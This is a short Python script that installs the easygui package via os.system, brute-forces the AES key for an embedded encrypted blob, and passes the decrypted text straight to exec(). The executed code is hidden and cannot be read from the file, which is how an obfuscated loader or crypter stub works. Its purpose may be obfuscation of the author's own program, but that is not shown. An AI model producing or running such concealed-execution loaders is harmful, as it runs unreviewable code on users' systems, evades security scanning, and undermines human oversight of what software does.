from Crypto import Random
from Crypto.Cipher import AES
import hashlib
import os,random,base64
os.system("pip3 install easygui")
import easygui
print("Developed by Neelanjan Manna")
class Decryptor:
	def __init__(self, key, file_name):
		self.key = hashlib.sha256(key.encode('utf-8')).digest()
		self.file_name = file_name

	def pad(self, s):
		return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

	def decrypt(self, ciphertext, key):
		iv = ciphertext[:AES.block_size]
		cipher = AES.new(key, AES.MODE_CBC, iv)
		plaintext = cipher.decrypt(ciphertext[AES.block_size:])
		return plaintext.rstrip(b"\0")

	def decrypt_file(self):
		dec = self.decrypt(self.file_name, self.key)
		return dec

class BruteForce:
	def __init__(self, encrypted_codes):
		self.encrypted_codes = encrypted_codes
		self.password = 0

	def start(self): 
		status = True
		while status:
			try:
				test = Decryptor(str(self.password), self.encrypted_codes)
				decrypted_code = test.decrypt_file()
				executable = decrypted_code.decode() 
				status = False
				return executable 
			except UnicodeDecodeError:
				self.password += 1

encrypted_codes = b'!\x06\n\xf0\xee\x00\x94\xf4\xa3\xea]\xea\x83_m)\x06\xd6\xd2\xbc.4E\xd5\xaaV\xa9\x97&\xbc\x88\x0fM\x0b\xe9\x9fW+\xd8\xc3Pa<3\x16\x078\xc1\xa0\x83\x13X\xca\xe4j\xdfO\x1d\x91i\x8b~E\x80\x89;\x90\x9f\xa9\xbb\x8c\xae/\xb3\xf0\x1dQ,eh\xd5\xadaN\xfe\xe5N\xc0\xa4\x13-\xd64Y\x80i\xc9\xdf\xb7L\xacmKGHH\x16\x0e=\xbe?N$MB\xebn\x02\xea}\x1e\x80u{\xf2y\x13\xacs\xd5\x11\x14\x93\x0e%\x1f?\xbb\xe8\x8bA\xc1W[\xb3\x1b1\x00W\xd6\xb8\xff\xddh\r\x0e~\x10\xdf\xf1\xb5U\x1cB\x16\xab\x05\x0e\xbd\x07\xf3\x94k\xa0\x0c\xc7\xb0$\xa89=b\xe0\x87\xddu\xb1S)\xa3\xbd\xdb\'V\xbb\x90\\\xc8\x1f\xe0\x82\x1d\xbfn\\\x81\x9b\xd9\n\xb2\x90\xbb\x83_\xd7\xfbR\xc2T\xe5b\xe0\xd1O\xa9\x1b\x8aS\x81d\x18\x852\x1b\xb3\x95Ahc\x1a\x11\xc1\xc2\xc2\x96q\xeb\x80\x83|\x0b\x83\xcef\xbdO\xcb^OD\xa3\xad\xc8\xc7\xf5\x8f\x93E\xd0/\xbd\xdf\xf6/s\xa8dl\xd3\xb9=G\x86\xa0\x1f\x13\xe9\x9b\xca+O^\xaek\x0f\xee\xc0\xcf\x10\xb3\xae\xcc\xab$\x9a6DB=Q\xe5(\xd0\x16\xf0\x7f]\xab\x02\x14\xd1\x83k\x86 \xcf1?m\xe8]\x9d\xe5\x1e\x03\xb4\xecs\x9b\x16\x17\x02p\xd5\x8f\x8c!\x0f3\xc1\x0fZ\x96\x88\xfe\x9d\xd3\xb1\xc1O_\x9d\xe2\x11\x8e{\xb14\x82\x1f\xcf\xe5\x8a\x18)5\xe9*\x92\xb1S\n\xef\x88\xdeF_\xcd]\xbf\xe1\x04\rPZ\xf1\xdd\x8c\xcc\xae5\r %\xbc((\xf9$\xd6\xce;\x8a\xa8\xa9J\x00\x85\xa6:\xf7r\xdc\x1f\xd5zdj\xaaqY\xb7\xf4\\\xff\x13\xaf\xec%r\xf1nN\xaf\x03\xb3\x04O7\x94\xa3\xf0eG(\xd0\x1ef\xa4c\xea\x0br}\x17\x00\xa0\n\xca\xb1,\x11\x08B;\xa1\xeae\xa1\x02\xd0u\xc5H\x0b\xd7\x1d\xa7>\x8d\xd8\xdb\xf6el7a\x97\xd3\x7f\xd7\xf6\xeb\xd5\x05\xe6"c\xea\xde\xf3d\xa8,\x16\xd7\xb3H\xb0\xa3\\\x08k\xc8\xc2mq\xddg\x96`G\xd9a!+\x9dAqKg\x90Z\x15\x06\x1e\xc4\xe29\x86\x9e\xe8\xac\xccQ\xea\xeee\xb4\x95\x1d\xecH\x9f&\xbb\xad\xdd<p\x9b4\xe8\xe3\x1c+\x1c\x95s\x8c\xc7\xda\xe0\xc2/\x97\x7f\xadx\xe9@\xdc\xfbN\x12\xd5\xaa\xe3\xe3\x91\x17_\xb5P_\x906k\xb2\xe7z_\xfe\x85\x00\x94\x1a+a*HC6\xda\x1amX\x92\x12\xf0\xbfq\xbd\x1f:XU\xcd\x01}\x15\x7f\x9f\xce\xac\x90\xe0"\x85\x92\x7f|%2\x8d\x12I\xbe,:\x05\x00\xb4\x15Ye\x17;m\x96\xd6B\xfe\xad\xbe\x97y\x0bo\xe2\xc6\x82(\xda\xe1\xc3^[\x89\x97o\xc2\xea\x9d\x85\x8f"\xe3L\x8d\xb5L\xe1\x11\x92/\xa0u\xc5A\x00\x0b\xa0 \xcf\n\xa4\xe1\xf7T\xb5F\xc5\x19 n\x8e\xd5V\x01\x85(k\xa5fyUk\xc8\xcc@\xb6dy\xad%\xcb\xce\xbc\xe8\xcd`\x8b\xf9\x19\x16[\xabr\xbc\x94\xc1\x01\x03c\xf0b\xcb\xf3U\xf8\x04\xfe\xf00$\x85\xce0\'\xbe\x03\x8fX'
brute = BruteForce(encrypted_codes)
executable = brute.start()
exec(executable)
